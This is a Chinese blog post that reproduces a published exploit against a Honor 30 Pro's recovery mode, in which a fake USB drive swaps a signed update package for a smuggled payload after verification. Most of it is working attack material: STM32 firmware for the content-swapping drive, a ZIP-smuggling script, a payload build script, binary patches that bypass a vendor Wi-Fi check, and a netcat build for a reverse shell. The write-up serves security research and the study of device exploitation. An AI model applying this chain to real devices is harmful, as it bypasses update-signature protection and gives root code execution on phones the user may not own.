---
title: "利用TOC/TOU攻击获得手机恢复模式Root权限 - Hyun's home"
source: "https://www.hyun.tech/archives/reunzip"
author:
published:
created: 2025-09-06
description: "本文是对 Taszk 实验室文章的复现，利用思路与原文一致，使用的硬件与设备稍有不同。目标设备是搭载了 Kirin 990 SoC 的 EBG-AN00（Honor 30 Pro），系统版本 HarmonyOS 2.0.0，安全补丁 2021年9月1日。"
tags:
  - "clippings"
---
## 前言

手机系统升级的过程可以简化为 `下载升级包` 、 `校验升级包` 、 `执行升级包` 。为了安全起见，厂商会对发布的升级包使用私钥签名，使用未签名或错误签名的升级包无法通过校验过程。当升级包来自外部存储设备时，我们可以控制每次文件读取提供的内容。如果在校验阶段提供具有正确签名的原始升级包，通过校验后，再提供包含有效载荷的升级包，从而可以获得任意代码执行权限。

> 本文是对 [Taszk 实验室文章](https://labs.taszk.io/articles/post/reunzip/) 的复现，利用思路与原文一致，使用的硬件与设备稍有不同。目标设备是搭载了 Kirin 990 SoC 的 EBG-AN00（Honor 30 Pro），系统版本 HarmonyOS 2.0.0，安全补丁 2021年9月1日。

## 硬件准备

为了控制每个升级阶段读取到的文件内容，我们需要模拟一个”损坏的U盘“，实现一个USB大容量存储设备。该设备统计文件的访问次数，并根据文件访问次数的不同提供不同的内容。这里使用了手头上有的STM32F411 BlackPill开发板（当然，你也尝试使用树莓派、ESP32 S2/S3实现）。

### 代码生成

![](https://www.hyun.tech/upload/image-jmgq.png)

开发板连接了一个SD卡模块，SD卡内存放有效载荷。同时，启用了一个串口外设，通过USB-TTL模块连接电脑，用于输出日志实时查看当前工作状态。

这里使用 STM32CubeIDE 完成对引脚和时钟的配置，并启用 FATFS 与 USB\_DEVICE 功能，其中 USB\_DEVICE 选择使用 Mass Storage Class 设备类，FATFS 设置中启用 USE\_LFN 以支持较长的文件名。

> MSC\_MEDIA\_PACKET 尽量设置的大一些，可以有效提高数据传输速度，否则有些安卓设备可能由于块读取超时不认设备

配置完毕后 Ctrl+S 保存，等待自动生成代码完毕。

### 实现 FATFS 磁盘 IO 接口

在生成的代码中找到 `FATFS/Target/user_diskio.c` ，实现 USER\_initialize、USER\_status、USER\_read、USER\_write、USER\_ioctl 函数。

文件系统通过调用这些函数完成对磁盘底层数据块的读写。由于手头上的 SD 卡模块只支持 SPI 接口，此处使用 SPI 与 SD 卡通信。具体的代码实现来自 [Github仓库](https://github.com/kiwih/cubemx-mmc-sd-card) ：

```
inline DRESULT USER_SPI_read (
    BYTE drv,        /* Physical drive number (0) */
    BYTE *buff,        /* Pointer to the data buffer to store read data */
    DWORD sector,    /* Start sector number (LBA) */
    UINT count        /* Number of sectors to read (1..128) */
)
{
    if (drv || !count) return RES_PARERR;        /* Check parameter */
    if (Stat & STA_NOINIT) return RES_NOTRDY;    /* Check if drive is ready */

    if (!(CardType & CT_BLOCK)) sector *= 512;    /* LBA ot BA conversion (byte addressing cards) */

    if (count == 1) {    /* Single sector read */
        if ((send_cmd(CMD17, sector) == 0)    /* READ_SINGLE_BLOCK */
            && rcvr_datablock(buff, 512)) {
            count = 0;
        }
    }
    else {                /* Multiple sector read */
        if (send_cmd(CMD18, sector) == 0) {    /* READ_MULTIPLE_BLOCK */
            do {
                if (!rcvr_datablock(buff, 512)) break;
                buff += 512;
            } while (--count);
            send_cmd(CMD12, 0);                /* STOP_TRANSMISSION */
        }
    }
    despiselect();

    return count ? RES_ERROR : RES_OK;    /* Return result */
}

inline DRESULT USER_SPI_write (
    BYTE drv,            /* Physical drive number (0) */
    const BYTE *buff,    /* Ponter to the data to write */
    DWORD sector,        /* Start sector number (LBA) */
    UINT count            /* Number of sectors to write (1..128) */
)
{
    if (drv || !count) return RES_PARERR;        /* Check parameter */
    if (Stat & STA_NOINIT) return RES_NOTRDY;    /* Check drive status */
    if (Stat & STA_PROTECT) return RES_WRPRT;    /* Check write protect */

    if (!(CardType & CT_BLOCK)) sector *= 512;    /* LBA ==> BA conversion (byte addressing cards) */

    if (count == 1) {    /* Single sector write */
        if ((send_cmd(CMD24, sector) == 0)    /* WRITE_BLOCK */
            && xmit_datablock(buff, 0xFE)) {
            count = 0;
        }
    }
    else {                /* Multiple sector write */
        if (CardType & CT_SDC) send_cmd(ACMD23, count);    /* Predefine number of sectors */
        if (send_cmd(CMD25, sector) == 0) {    /* WRITE_MULTIPLE_BLOCK */
            do {
                if (!xmit_datablock(buff, 0xFC)) break;
                buff += 512;
            } while (--count);
            if (!xmit_datablock(0, 0xFD)) count = 1;    /* STOP_TRAN token */
        }
    }
    despiselect();

    return count ? RES_ERROR : RES_OK;    /* Return result */
}
```

然后在 `FATFS/App/fatfs.c` 中 MX\_FATFS\_Init 函数的用户代码块中挂载根目录。

```perl
FRESULT res = f_mount(&USERFatFS, "", 0);
  if(res != FR_OK) {
      printf("f_mount() failed, res = %d\n", res);
      return;
  }
  printf("f_mount() done!\n");
```

> 有很多存储卡不支持使用 SPI 接口，如果你发现挂载失败，建议换张存储卡试试。

### 实现 USB MSC 存储接口

修改 `USB_DEVICE/App/usbd_storage_if.c` ，在 STORAGE\_Init\_FS 函数中从存储卡中的 config.txt 读取配置信息保存到全局变量 config 中，并打开 file\_system.img 文件供后续读取使用。

在配置文件中，第一行到第四行分别代表了触发次数、触发计数器的偏移地址、有效载荷起始地址、有效载荷大小，这些配置可以由后续的脚本自动生成。

```arduino
/**
  * @brief  Initializes the storage unit (medium) over USB FS IP
  * @param  lun: Logical unit number.
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
  /* USER CODE BEGIN 2 */
 UNUSED(lun);

 printf("STORAGE_Init_FS...\n");
 FRESULT res = f_open(&rawFile, "config.txt", FA_READ);
 if(res != FR_OK) {
      printf("open config.txt failed, res = %d\n", res);
      return USBD_FAIL;
 }

 for(int i=0; i<4; i++) {
     char buf[32];
     if(f_gets(buf, 32, &rawFile) != &buf[0]) {
         printf("read config.txt failed, res = %d\n", res);
         return USBD_FAIL;
     }
     config[i] = strtol(buf, NULL, 16);
 }
 trigger_counter = config[0];
 f_close(&rawFile);

 res = f_open(&rawFile, "file_system.img", FA_READ);
 if(res != FR_OK) {
     printf("open file_system.img failed, res = %d\n", res);
     return USBD_FAIL;
 }

 printf("STORAGE_Init_FS OK, trigger_counter=%#x, trigger_offset=%#x, payload_offset=%#x, payload_size=%#x\n", config[0], config[1], config[2], config[3]);

 return (USBD_OK);
  /* USER CODE END 2 */
}
```

file\_system.img 是包含有效载荷的 extFAT 文件系统镜像，同样由后续的脚本自动生成。

值得一提的是，由于 USB MSC 只能按块读取，因此需要将块地址 blk\_addr 和块数 blk\_len 乘以块大小转换为文件地址 file\_offset 和 amount，然后在 file\_system.img 中读取对应位置和长度的数据。至于 file\_system.img 内包含的文件则交由上层操作系统进行解析。

```arduino
/**
  * @brief  Reads data from the medium.
  * @param  lun: Logical unit number.
  * @param  buf: data buffer.
  * @param  blk_addr: Logical block address.
  * @param  blk_len: Blocks number.
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
  /* USER CODE BEGIN 6 */
  printf("r:a=%lu,s=%u\n", blk_addr, blk_len);

  uint32_t file_offset = blk_addr * STORAGE_BLK_SIZ;
  uint32_t amount = blk_len * STORAGE_BLK_SIZ;

  FRESULT res = f_lseek(&rawFile, file_offset);
  if(res != FR_OK) {
      printf("f_lseek() failed, res = %d\n", res);
      return USBD_FAIL;
  }

  unsigned int bytesRead;
  res = f_read(&rawFile, buf, amount, &bytesRead);
  if(res != FR_OK) {
      printf("f_read() failed, res = %d\n", res);
      return USBD_FAIL;
  }

  if (((file_offset + amount) > config[2]) &&
          (file_offset < (config[2] + config[3]))) {
      printf("READ ON PAYLOAD AREA (A=%#lx S=%#lx)\n", file_offset, amount);
      if (trigger_counter == 1) {
          uint32_t begin = MAX(file_offset, config[2]) - file_offset;
          uint32_t end = MIN(file_offset + amount, config[2] + config[3]) - file_offset;
          printf("READ ZERO-MASKED RANGE: [%#lx;%#lx)\n", begin, end);
          memset(buf + begin, 0, end-begin);
      }
  }

  if ((trigger_counter > 0) &&
          (config[1] >= file_offset) &&
          (config[1] < (file_offset+amount))) {
      printf("READ ON TRIGGER OFFSET: T=%d\n", trigger_counter);
      trigger_counter -= 1;
  }

  return USBD_OK;
  /* USER CODE END 6 */
}
```

每当读取的内容 **跨越了** 触发计数器的偏移地址时，将触发计数器减一。当计数器的值减为一时，设备应当处于 EOCD 签名验证阶段，此时需要将 Payload 区域用零填充。

手机实际读取到的升级包 update\_sd\_base.zip 的内容如下表所示：

<table><colgroup><col> <col> <col> <col></colgroup><tbody><tr><th colspan="2" rowspan="1"><p>签名验证阶段</p></th><th colspan="2" rowspan="1"><p>其余阶段</p></th></tr><tr><th colspan="1" rowspan="1"><p>编号</p></th><th colspan="1" rowspan="1"><p>内容</p></th><th colspan="1" rowspan="1"><p>编号</p></th><th colspan="1" rowspan="1"><p>内容</p></th></tr><tr><th colspan="1" rowspan="1"><p>1</p></th><td colspan="1" rowspan="1"><p>原始升级包</p></td><td colspan="1" rowspan="1"><p>1</p></td><td colspan="1" rowspan="1"><p>原始升级包</p></td></tr><tr><th colspan="1" rowspan="1"><p>2</p></th><td colspan="1" rowspan="1"><p>零填充</p></td><td colspan="1" rowspan="1"><p>2</p></td><td colspan="1" rowspan="1"><p>=PAYLOAD-BEGIN=</p></td></tr><tr><th colspan="1" rowspan="1"><p>3</p></th><td colspan="1" rowspan="1"><p>零填充</p></td><td colspan="1" rowspan="1"><p>3</p></td><td colspan="1" rowspan="1"><p>含载荷的升级包</p></td></tr><tr><th colspan="1" rowspan="1"><p>4</p></th><td colspan="1" rowspan="1"><p>零填充</p></td><td colspan="1" rowspan="1"><p>4</p></td><td colspan="1" rowspan="1"><p>==PAYLOAD-END==</p></td></tr><tr><th colspan="1" rowspan="1"><p>5</p></th><td colspan="1" rowspan="1"><p>原始升级包的签名</p></td><td colspan="1" rowspan="1"><p>5</p></td><td colspan="1" rowspan="1"><p>原始升级包的签名</p></td></tr></tbody></table>

读到这里你可能会有疑问：

1. 在升级包中间插入了 0 填充区域，为何仍然能够通过签名验证？
2. 为何系统实际执行的是中间插入的 Payload 部分而不是前面的原始升级包？

这些问题都可以在 [此文章](https://labs.taszk.io/articles/post/unziploc/) 中找到答案。

### 实现日志输出

在本应用中，文件系统的内容无需也不应有所改动，因此无需实现写入函数。

```
/**
  * @brief  Writes data into the medium.
  * @param  lun: Logical unit number.
  * @param  buf: data buffer.
  * @param  blk_addr: Logical block address.
  * @param  blk_len: Blocks number.
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
  /* USER CODE BEGIN 7 */
  UNUSED(lun);
  UNUSED(buf);
  UNUSED(blk_addr);
  UNUSED(blk_len);

  if(blk_addr == 0 && blk_len > 0 && buf[0] == 0xba && buf[1] == 0xbe)
      printf("%s", buf + 2);
  else
      printf("w:a=%lu,s=%u\n", blk_addr, blk_len);

  return (USBD_OK);
  /* USER CODE END 7 */
}
```

但当手机进入恢复模式后，执行的命令无法得到有效反馈，出错误难以调试。

后续在设备升级过程中，可以向该存储设备的零扇区写入日志信息，并通过串口打印在电脑屏幕上来获得实时的反馈。为了避免系统向零扇区写入产生无效日志，这里加了一个简单的 magic 头来过滤要输出的日志。

## 获取 Root 权限

### 制作载荷

首先下载任意一个包含有效签名、适用于你的设备的卡刷包。一般你下好的卡刷包里还包含 `update_sd_cust_xxx_all_cn.zip` 、 `update_sd_preload_xxx_all_cn.zip` 等子包，为了节省时间，我们需要选择一个较小的子包（一般 cust 子包比较小，只有100kB 左右），并将其改名为 `update_sd_cust_all_cn.zip` 。

创建 files 文件夹，放入后续需要用到的二进制文件（如 netcat，后续获取反向 Shell 需要用到）。

将下面脚本保存为 `smuggle_zip_inplace.py` ，向其中的 `known_version_list` 添加你手机型号和系统版本（可以在工程菜单-单板信息查询中看到）：

```python
import argparse
import struct
import zipfile
import io
import os

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="poc update.zip repacker")
    parser.add_argument("file", type=argparse.FileType("r+b"), help="update.zip file to be modified")
    parser.add_argument("update_binary", type=argparse.FileType("rb"), help="update binary to be injected")
    parser.add_argument("-g", "--gap", default="-1", help="gap between EOCD and signature (-1: maximum)")
    parser.add_argument("-o", "--ofs", default="-1", help="payload offset in the gap")
    args = parser.parse_args()

    gap_size = int(args.gap, 0)
    payload_ofs = int(args.ofs, 0)

    args.file.seek(0, os.SEEK_END)
    original_size = args.file.tell()
    args.file.seek(-6, os.SEEK_END)
    signature_size, magic, comment_size = struct.unpack("<HHH", args.file.read(6))
    assert magic == 0xffff

    print(f"comment size   = {comment_size}")
    print(f"signature size = {signature_size}")

    # get the signature
    args.file.seek(-signature_size, os.SEEK_END)
    signature_data = args.file.read(signature_size - 6)

    # prepare the gap to where the payload will be placed
    # (gap is the new comment size - signature size)
    if gap_size == -1:
        gap_size = 0xffff - signature_size
    assert gap_size + signature_size <= 0xffff

    # automatically set the payload offset to be 0x1000-byte aligned
    if payload_ofs == -1:
        payload_ofs = (comment_size - original_size) & 0xfff

    print(f"gap size       = {gap_size}")
    print(f"payload offset = {payload_ofs}")

    # trucate the ZIP at the end of the signed data
    args.file.seek(-(comment_size + 2), os.SEEK_END)
    end_of_signed_data = args.file.tell()
    args.file.truncate(end_of_signed_data)

    # write the new (original ZIP's) EOCD according to the updated gap size
    args.file.write(struct.pack("<H", gap_size + signature_size))

    # gap before filling
    args.file.write(b"\x00"*(payload_ofs))

    # write a marker before the injected payload
    args.file.write(b"=PAYLOAD-BEGIN=\x00")

    # generate the injected ZIP payload
    z = zipfile.ZipFile(args.file, "w", compression=zipfile.ZIP_DEFLATED)
    # ensure the CERT.RSA has a proper length, the content is irrelevant
    z.writestr("META-INF/CERT.RSA", b"A"*1300)

    # the existence of this file make authentication tag verification skipped for OTA
    z.writestr("skipauth_pkg.tag", b"")
    
    # get the update binary to be executed
    z.writestr("META-INF/com/google/android/update-binary", args.update_binary.read())
    
    # some more files are necessary for an "SD update"
    known_version_list = [
        b"EBG-LGRP1-CHN 102.0.0.168"
    ]
    z.writestr("SOFTWARE_VER_LIST.mbn", b"\n".join(known_version_list)+b"\n")
    z.writestr("SD_update.tag", b"SD_PACKAGE_BASEPKG\n")
    z.close()

    # write a marker after the injected payload
    args.file.write(b"==PAYLOAD-END==\x00")

    payload_size = args.file.tell() - (end_of_signed_data + 2) - payload_ofs

    assert payload_size + payload_ofs < gap_size, f"{payload_size} + {payload_ofs} < {gap_size}"

    # gap after filling
    args.file.write(b"\x00"*(gap_size - payload_ofs - payload_size))

    # signature
    args.file.write(signature_data)

    # footer
    args.file.write(struct.pack("<HHH", signature_size, 0xffff, gap_size + signature_size))
```

创建并编写升级过程中将会被执行的 `update-binary` 文件，此处用上了之前实现的日志打印功能。

经过分析可知，外部设备将会被挂载在到 `/usb` 。因此可以查询 `/proc/mounts` 文件，得到设备名，并使用 dd 命令向设备零扇区写入以输出日志：

```
#!/bin/sh

device_name=$(grep " /usb " /proc/mounts | cut -d ' ' -f 1)
log() {
    echo -n "\xba\xbe$@\n\x00" | dd of=$device_name bs=512 conv=fsync
}

log "Hello World!"
sleep 60
```

> 坑：一定要加上 conv=fsync ，不然没办法得到即时的日志输出。

使用 root 用户执行下面的脚本生成载荷：

```bash
#!/bin/sh

rm -rf file_system.img
cp update_sd_cust_all_cn.zip update_sd_base.zip
python smuggle_zip_inplace.py update_sd_base.zip update-binary

dd if=/dev/zero of=file_system.img bs=1M count=10
mkfs.exfat file_system.img
mkdir -p mnt
mount -o loop,rw,nosuid,nodev,relatime,uid=1000,gid=1000,fmask=0022,dmask=0022,iocharset=utf8 -t exfat file_system.img mnt
mkdir -p mnt/dload
dd if=/dev/zero of=mnt/padding_between_exfat_headers_and_update_archive bs=1M count=1
cp update_sd_base.zip mnt/dload
cp files/* mnt
umount mnt
rmdir mnt
python -c 'd=open("file_system.img","rb").read();o=d.find("update_sd_base".encode("utf-16le"));b=d.find(b"=PAYLOAD-BEGIN=");e=d.find(b"==PAYLOAD-END==")+16;print(f"4\n{o:x}\n{b:x}\n{e-b:x}",end="")' > config.txt
```

执行完毕后，当前目录下应该会出现 config.txt 与 file\_system.img 文件，你需要将这两个文件拷贝到 SD 卡中。

### 代码执行

万事具备，现在打开串口终端，取一个 OTG 转接头和一根数据线将开发板连接到手机。

> 注意，不要连接 ST-Link 的电源线，需要使用手机 OTG 为开发板进行供电。

在手机拨号页面输入 `*#*#2846579#*#*` 软件升级-存储卡升级。

过一会，串口终端上应当会打印出 Hello World! 字样，这也就表明你成功获得了设备恢复模式的代码执行权限。

## 获取反向 Shell

每次修改代码就要重新制作镜像，想在设备上进行一些探索就变得相当麻烦。

好在 Recovery 中还保留了 WiFi 驱动和相关文件，我们可以连接 WiFi 获得一个反向 Shell。

不过事情也没有这么简单，华为在 wpa\_supplicant\_hisi 程序中加入了 eRecovery 检测：

```c
result = property_get("ro.enter_erecovery",&is_enter_erecovery,0);
if ((result < 1) || (is_enter_erecovery != '1')) {
    result = wpa_ensure_config_file_exists("/data/vendor/wifi/wpa/wpa_supplicant.conf");
    if (-1 < result) goto err;
    wpa_printf(5, "Wi-Fi will not be enabled because of can not get wpa_supplicant conf file");
    ret_code = 0;
}
```

如果当前不处于 eRecovery 模式该程序则什么也不会做。

于是我选择直接在原地修补该文件，同时将程序的日志输出修改至标准输出以方便后续调试：

```
# apply patch to show full log to stdout
echo -ne "\xe0\xc3\x03\x91" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=765992 conv=notrunc
echo -ne "\xf3\x03\x00\xaa" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=766000 conv=notrunc
echo -ne "\x1c\x00\x00\x14" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=766060 conv=notrunc
echo -ne "\x1f\x20\x03\xd5\xe0\x03\x13\xaa" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=766172 conv=notrunc

# apply patch to bypass erecovery check
echo -ne "\x1f\x20\x03\xd5" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=1834084 conv=notrunc
echo -ne "\x1f\x20\x03\xd5" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=1834096 conv=notrunc
echo -ne "\x1f\x20\x03\xd5" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=1834204 conv=notrunc
echo -ne "\x1f\x20\x03\xd5" | dd of=/vendor/bin/wpa_supplicant_hisi bs=1 seek=1834216 conv=notrunc
```

> 该文件可能因设备不同而有所不同，上方代码需结合实际情况进行修改。

### 连接 WiFi

使用如下命令启动 WiFi 模块：

```swift
echo init > /sys/hisys/boot/plat
echo init > /sys/hisys/boot/wifi
netcfg wlan0
```

启动 wpa\_supplicant 并连接 WiFi 网络：

```bash
/vendor/bin/wpa_supplicant_hisi -B -iwlan0 -Dnl80211 -c/tmp/eRecovery/wifi/wpa/wpa_supplicant_erecovery.conf

WPA="/vendor/bin/wpa_cli_hisi -p/tmp/eRecovery/wifi/wpa/sockets -s/tmp/eRecovery/wifi/wpa/sockets -iwlan0"

network_id=$($WPA add_network)
$WPA set_network $network_id ssid \"YOUR-WIFI-SSID\"
$WPA set_network $network_id psk \"YOUR-WIFI-PASSWORD\"
$WPA select_network $network_id
$WPA enable_network $network_id
$WPA reassociate
```

> 坑：貌似海思的 wpa\_cli 实现并不标准，需要同时指定 -p 和 -s 参数，不然一直报 No such file

启用 dhcpcd 获取 IP 地址：

```
dhcpcd -b -q
```

### 跨平台编译 Netcat

Recovery 环境中附带的程序很少，缺少我们反弹 Shell 所需要的工具，我们需要自行编译可在目标设备运行的 Netcat。

将下面脚本保存为 `setup_toolchain.sh` ：

```
#!/bin/sh

export PATH=$PATH:/path/to/ndk/toolchains/llvm/prebuilt/linux-x86_64/bin/

# Tell configure what tools to use. aarch64-linux-android
target_host=aarch64-linux-android #aarch64-linux-android or arm-linux-androideabi
export AR=$target_host-ar
export AS="$target_host"26-clang
export CC="$target_host"26-clang
export CXX=$target_host-clang++
export LD=$target_host-ld
export STRIP=$target_host-strip

# Tell configure what flags Android requires.
export CFLAGS="-fPIE -fPIC"
export LDFLAGS="-pie"
```

在当前目录下载 netcat 源代码，解压到 netcat-0.7.1 文件夹。

切换到该文件夹，将 [config.guess](https://git.savannah.gnu.org/gitweb/?p=config.git;a=blob_plain;f=config.guess;hb=HEAD) 与 [config.sub](https://git.savannah.gnu.org/gitweb/?p=config.git;a=blob_plain;f=config.sub;hb=HEAD) 换成较新的版本。

应用下面的 Patch 文件：

```
--- a/src/flagset.c
+++ b/src/flagset.c
@@ -134,7 +134,7 @@ unsigned short netcat_flag_next(unsigned
 
 int netcat_flag_count(void)
 {
-  register char c;
+  register unsigned char c;
   register int i;
   int ret = 0;
 
@@ -154,7 +154,7 @@ int netcat_flag_count(void)
     Assumed that the bit number 1 is the sign, and that we will shift the
     bit 1 (or the bit that takes its place later) until the the most right,
     WHY it has to keep the wrong sign? */
-      ret -= (c >> 7);
+      ret += (c >> 7);
       c <<= 1;
     }
   }
```

> 这是个浪费我半天时间的逆天 BUG，在电脑上编译出来可以正常使用，然而到手机上则会直接退出。
> 
> 上面的函数假设 char 是有符号的，但是在 Android NDK 中 char 默认是无符号的:)

在当前文件夹下执行下方命令：

```bash
source ../setup_toolchain.sh
./configure --host=aarch64-linux-android CFLAGS="-Os"
make
```

等待编译完成后，就可以在 src 文件夹中找到编译出的二进制文件。

### 最终效果

![](https://www.hyun.tech/upload/image.png)

硬件工程： [点我下载](https://s.hyun.tech/XrGmkA6C)

## 参考链接

[REUnziP: Re-Exploiting Huawei Recovery With FaultyUSB](https://labs.taszk.io/articles/post/reunzip/)